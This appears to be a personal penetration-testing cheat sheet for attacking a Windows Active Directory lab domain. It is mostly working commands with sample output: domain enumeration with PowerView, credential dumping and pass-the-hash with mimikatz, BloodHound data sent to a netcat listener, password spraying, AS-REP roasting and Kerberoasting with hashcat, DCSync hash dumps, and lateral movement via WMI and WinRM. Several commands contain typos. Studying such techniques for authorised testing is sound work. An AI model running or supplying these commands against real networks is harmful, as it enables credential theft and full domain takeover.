### basic command of domain
  >sysdm.cpl   #computer config
  dsa.msc  #AD mgr,add delete user
  net userusername passwd /add /domain     #add domain user
  net group "Domain Admins" clare /add /domain   #add a user to dmmain admin group
  gpupdate /force      #update the gp group policy. \n
  net share sharename=c:\foldername          # share a folder
  setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin
  >net accounts    /login policy
  >Write-Output "${env:COMPUTERNAME}"  //get computername

### emulate info of domain
  powershell.exe -nop -exec bypass  #fireup the powershell
    #Powerview to emulate the domain infor;
  Import-Module .\PowerView.ps1
  Get-NetDOmain
  >Get-NetUser | select cn
  Get-NetGroup \n
    Get-NetComputer
    Find-LocalAdminAccess  #important
  
    Get_NetSession -ComputerName $computerName  #get other user which has net session with this host& not guarantee to use
      
    Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use


### mimikaz :to get the hash of remote access admin
  privilege::debug    #run this first, to test the privi of mimikaz

  sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host

###  check services running on this host or domain by spn
  Get-NetUser -SPN select serviceprincipalname, samaccountname

  net user sqladmin /domain

### check the privi of account to Domain admins grp "ActiveDirectoryRIghts" like gernericAll
  Get-objectAcl -Identify "Domain admins"   /only get the SID of the account

  Convert-SidToName $UID  /to convert

  / if we find a SID is diff from other,, try to compromise this ID
  / net group "Domain Admins" $username(which you controlled)  /add /domain
    / net group "Domain Admins" $username(which you controlled)  /del /domain
  
### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
  / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
  Import-Module .\SharpHound

  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 

  Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials

  nc -nvlp $port > name.zip

  ####neo4j   for bloodhound
    $sudo neo4j start

    $bloodhound
      upload the .zip==> analysis ==> shortest paths
          match (m:Computer) return m , or m:User
          then mark a cimputeror user as owned. click shortest path from owned priciplals
          right click the connection to view the suggestions.

  ### passwd spray
    /netexec   #pwned means right.

    $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendan1024' -d inmy.com --continue-on-success 
      SMB         10.0.2.14       445    WIN10-3ALICE     [*] Windows 10 Pro 10240 x64 (name:WIN10-3ALICE) (domain:inmy.com) (signing:False) (SMBv1:True)
      SMB         10.0.2.14       445    WIN10-3ALICE     [+] inmy.com\alice:Bendan1024 (Pwn3d!)

    /kerbrute.exe

  ### without pre-auth from kerburos. anyone can request a SK1 without auth.
  #### sk1 is encrypted by requestors passwd hash. so, from sk1 we can decrypt the passwd from hash. But we need a passwd of a account like Alice 
    /let's say, bob has this privi
    $ impacket-GetNPUsers -dc-ip 10.0.2.3 -request -outputfile hash inmy.com/alice
      Impacket v0.12.0.dev1 - Copyright 2023 Fortra
      Password:
      Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
      ----  --------  --------------------------  --------------------------  --------
      bob             2024-12-02 23:59:40.852364  2024-12-05 00:50:13.750371  0x400200 
      
      $krb5asrep$23$bob@INMY.COM:78235c4750327c8df4b5bf6996228911$ec2d6341b2d2085f26eed262f7eb954  
    Then use hashcat to bruteforce the hash, the last one the used in kerberos AS-REQ
      $ hashcat --help | grep -i kerberos
        19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
        19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
        28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
        19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
        19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
        28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
         7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
        13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
        18200 | Kerberos 5, etype 23, AS-REP

      $ hashcat -m 18200 hash passwd.txt #passwd list is requrired.
          hashcat (v6.2.6) starting

  ### crack the SPN account by using a user account TGS-REQ
    $ impacket-GetUserSPNs -request -dc-ip 10.0.2.3 inmy.com/alice:Bendan1024
      Impacket v0.12.0.dev1 - Copyright 2023 Fortra
      
      ServicePrincipalName     Name      MemberOf                                  PasswordLastSet             LastLogon                   Delegation 
      -----------------------  --------  ----------------------------------------  --------------------------  --------------------------  ----------
      HOST/sqladmin.inmy.com   sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      HTTP/sqladmin.inmy.com   sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      MSSQL/sqladmin.inmy.com  sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      
      [-] CCache file is not found. Skipping...
      $krb5tgs$23$*sqladmin$INMY.COM$inmy.com/        sqladmin*$f1f58632d5f5860fa52120c981839492$70d2d8e7fcf92b114d8e29efc7ebacedb346ff7a4b84be120bf234cbecb22fc6091187bd70d7db88307083bd8994bdf8961022bddcce00b2067df6451561b00cfe2d
        //if met 'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'
          $ sudo timedatectl set-ntp 0  /to stop ntp
          $ sudo rdate -n 10.0.2.3 /may need this to syc date from DC DNS server
      //put the result into hash.kerberos to crach it using hashcat
      $hashcat -m 13100 hash.kerberos passwd.txt 
        hashcat (v6.2.6) starting
    #### with the Account of SPN service, to create golden ticket to a particular service
      $whoami /user   //to get SUID of domain
        用户名        SID
        ============= =============================================
        inmy\sqladmin S-1-5-21-424443570-3024089592-1732281603-1107
          // S-1-5-21-424443570-3024089592-1732281603 domain ID  
              1107 is user ID
  ### with a account od domain, use sync DC method to get other account of domain
    $ impacket-secretsdump -just-dc-user administrator inmy.com/alice:"passwdofalice"@$IPofDC
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:73394b31c1dfc30c5e91c2366f5450d8:::
    [*] Kerberos keys grabbed
    Administrator:aes256-cts-hmac-sha1-96:c0c06f9870d66863b1163a711808b95f2408e7db3c1a47ff6336a61322f90506
    Administrator:aes128-cts-hmac-sha1-96:acf685382eadbc50364359ecc85923df
    Administrator:des-cbc-md5:2f3ed6b5cefef7fd
    [*] Cleaning up... 

      //Administrator:500:aad3b435b51404eeaad3b435b51404ee:73394b31c1dfc30c5e91c2366f5450d8:::
        73394b31c1dfc30c5e91c2366f5450d8 is the hash
  
  ## AD moving
    ### protocol wmi port 135
      $wmic "/node:win10-3-bob" process call create "cmd" or
      $wmic 
        > "/node:win10-3-bob" process call create "cmd"

      $tasklist  //to check applications running


      #### powershell way
        $username = 'alice';
        $passwd = 'passw';
        $secureString = ConvertTo-SecureString $passwd -AsPlainText -force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
        $Options = New-CimSessionOption -Protocol DCOM
        $session = New-CimSession -ComputerName 10.0.2.14 -Credential $credential -SessionOption $Options
        
        //you will 
            Id           : 1
            Name         : CimSession1
            InstanceId   : 9fdc188c-7004-40e7-b33b-337e03719064
            ComputerName : 10.0.2.14
            Protocol     : DCOM
        
        
        $Invoke-CimMethod -CimSession $session -ClassName Win43_process -MethodName Create -Arguments @{commandline = $command};
        //you will get 
            ProcessId ReturnValue PSComputerName
            --------- ----------- --------------
                            21 10.0.2.14

      #### win impacket-wmiexec -hashed $hash Adminstrator@IP  //or plain passwd
      
    ### protocol winrm port 5985,5986
        //to enable winrm 
        $Enable-PSRomenting -force

        //inside domain, winrs to exec shell
        $ winrs -r:"dc-server01" "cmd /c hostname & whoami"

        //outside the domain
        $winrs -r:"$hostname" -u:$username -p:Passwd "c,d /c xxxxxx"  //it is suggested to used base64 encoded codes after /c

        //in kali
        $ evil-winrm -u $uesrn -p passwd -i 10.0.2.14 

    ### if the DC administrator login on a host. use mimikatz get the cached hash. apply TGT
        $mimikatz # sekurlas::pth /user:$Aministror /domain:inmy.com /ntlm <hash> /run:PowerShell.exe
      
      
  

  
